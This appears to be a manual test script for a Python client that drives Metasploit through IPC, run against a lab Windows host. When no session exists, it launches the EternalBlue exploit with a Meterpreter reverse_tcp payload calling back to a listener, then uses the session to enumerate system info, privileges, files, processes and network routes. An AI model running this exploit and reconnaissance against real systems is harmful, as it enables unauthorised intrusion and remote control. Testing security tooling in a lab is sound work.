"""Manual test for core framework features with Windows Meterpreter session."""
import asyncio
import sys
sys.path.insert(0, "/app/python")
from assassinate.ipc.client import MsfClient

SEP = "=" * 60

async def test_section(name, coro):
    """Helper to run test section with error handling"""
    try:
        result = await coro
        print(f"  OK {name}")
        return result
    except Exception as e:
        print(f"  FAIL {name}: {e}")
        return None

async def main():
    async with MsfClient() as client:
        # FRAMEWORK API
        print(f"\n{SEP}\nFRAMEWORK API\n{SEP}")

        await test_section("framework_version", client.framework_version())
        await test_section("threads", client.threads())
        await test_section("framework_module_stats", client.framework_module_stats())
        await test_section("job_list", client.job_list())
        await test_section("plugins_list", client.plugins_list())

        # SESSION API
        print(f"\n{SEP}\nSESSION API\n{SEP}")

        sessions = await test_section("list_sessions", client.list_sessions())

        if not sessions:
            print("\n[!] No sessions - creating one via exploit")
            module_id = await client.create_module("exploit/windows/smb/ms17_010_eternalblue")
            await client.module_set_option(module_id, "RHOSTS", "172.22.0.4")
            await client.module_set_option(module_id, "LHOST", "172.22.0.5")
            await client.module_set_option(module_id, "LPORT", "4433")

            print("[*] Running exploit...")
            session_id = await client.module_exploit(module_id, "windows/x64/meterpreter/reverse_tcp", timeout=120.0)
            if session_id:
                sessions = [session_id]
                print(f"[+] Created session {session_id}")

        if sessions:
            sid = sessions[0]
            print(f"\n[*] Using session {sid}")

            # Session metadata
            info = await test_section("session_info", client.session_info(sid))
            print(f"      -> {info}")
            await test_section("session_type", client.session_type(sid))
            await test_section("session_alive", client.session_alive(sid))
            await test_section("session_desc", client.session_desc(sid))
            await test_section("session_via_exploit", client.session_via_exploit(sid))
            await test_section("session_via_payload", client.session_via_payload(sid))

            # METERPRETER SYSTEM INFO
            print(f"\n{SEP}\nMETERPRETER SYSTEM INFO\n{SEP}")

            sysinfo = await test_section("session_sys_sysinfo", client.session_sys_sysinfo(sid))
            if sysinfo:
                print(f"      -> OS: {sysinfo.get('OS')}")
                print(f"      -> Arch: {sysinfo.get('Architecture')}")
                print(f"      -> Computer: {sysinfo.get('Computer')}")

            uid = await test_section("session_sys_getuid", client.session_sys_getuid(sid))
            print(f"      -> {uid}")

            is_system = await test_section("session_sys_is_system", client.session_sys_is_system(sid))
            print(f"      -> Is SYSTEM: {is_system}")

            privs = await test_section("session_sys_getprivs", client.session_sys_getprivs(sid))
            if privs:
                print(f"      -> {len(privs)} privileges")

            # METERPRETER FILESYSTEM
            print(f"\n{SEP}\nMETERPRETER FILESYSTEM\n{SEP}")

            pwd = await test_section("session_fs_pwd", client.session_fs_pwd(sid))
            print(f"      -> {pwd}")

            sep = await test_section("session_fs_separator", client.session_fs_separator(sid))
            print(f"      -> Separator: {repr(sep)}")

            ls = await test_section("session_fs_ls C:\\", client.session_fs_ls(sid, "C:\\"))
            if ls:
                print(f"      -> {len(ls)} items in C:\\")

            exists = await test_section("session_fs_exists C:\\Windows", client.session_fs_exists(sid, "C:\\Windows"))
            print(f"      -> C:\\Windows exists: {exists}")

            # METERPRETER PROCESS
            print(f"\n{SEP}\nMETERPRETER PROCESS\n{SEP}")

            pid = await test_section("session_process_getpid", client.session_process_getpid(sid))
            print(f"      -> PID: {pid}")

            ps = await test_section("session_process_list", client.session_process_list(sid))
            if ps:
                print(f"      -> {len(ps)} processes")

            # METERPRETER NETWORK
            print(f"\n{SEP}\nMETERPRETER NETWORK\n{SEP}")

            ifaces = await test_section("session_net_get_interfaces", client.session_net_get_interfaces(sid))
            if ifaces:
                print(f"      -> {len(ifaces)} interfaces")

            routes = await test_section("session_net_get_routes", client.session_net_get_routes(sid))
            if routes:
                print(f"      -> {len(routes)} routes")

            # METERPRETER CLIENT CORE
            print(f"\n{SEP}\nMETERPRETER CLIENT CORE\n{SEP}")

            machine_id = await test_section("session_meterpreter_machine_id", client.session_meterpreter_machine_id(sid))
            print(f"      -> {machine_id}")

            guid = await test_section("session_meterpreter_session_guid", client.session_meterpreter_session_guid(sid))
            print(f"      -> {guid}")

            # TRANSPORT MANAGEMENT
            print(f"\n{SEP}\nTRANSPORT MANAGEMENT\n{SEP}")

            transports = await test_section("session_transport_list", client.session_transport_list(sid))
            if transports:
                print(f"      -> Session expiry: {transports.get('session_exp')}s")
                for t in transports.get('transports', []):
                    print(f"      -> Transport: {t.get('url')}")

        # DATABASE API
        print(f"\n{SEP}\nDATABASE API\n{SEP}")

        active = await test_section("db_active", client.db_active())
        print(f"      -> Active: {active}")

        driver = await test_section("db_driver", client.db_driver())
        print(f"      -> Driver: {driver}")

        workspaces = await test_section("db_workspaces", client.db_workspaces())
        if workspaces:
            print(f"      -> {len(workspaces)} workspaces")

        print(f"\n{SEP}\nALL TESTS COMPLETE\n{SEP}")

if __name__ == "__main__":
    asyncio.run(main())
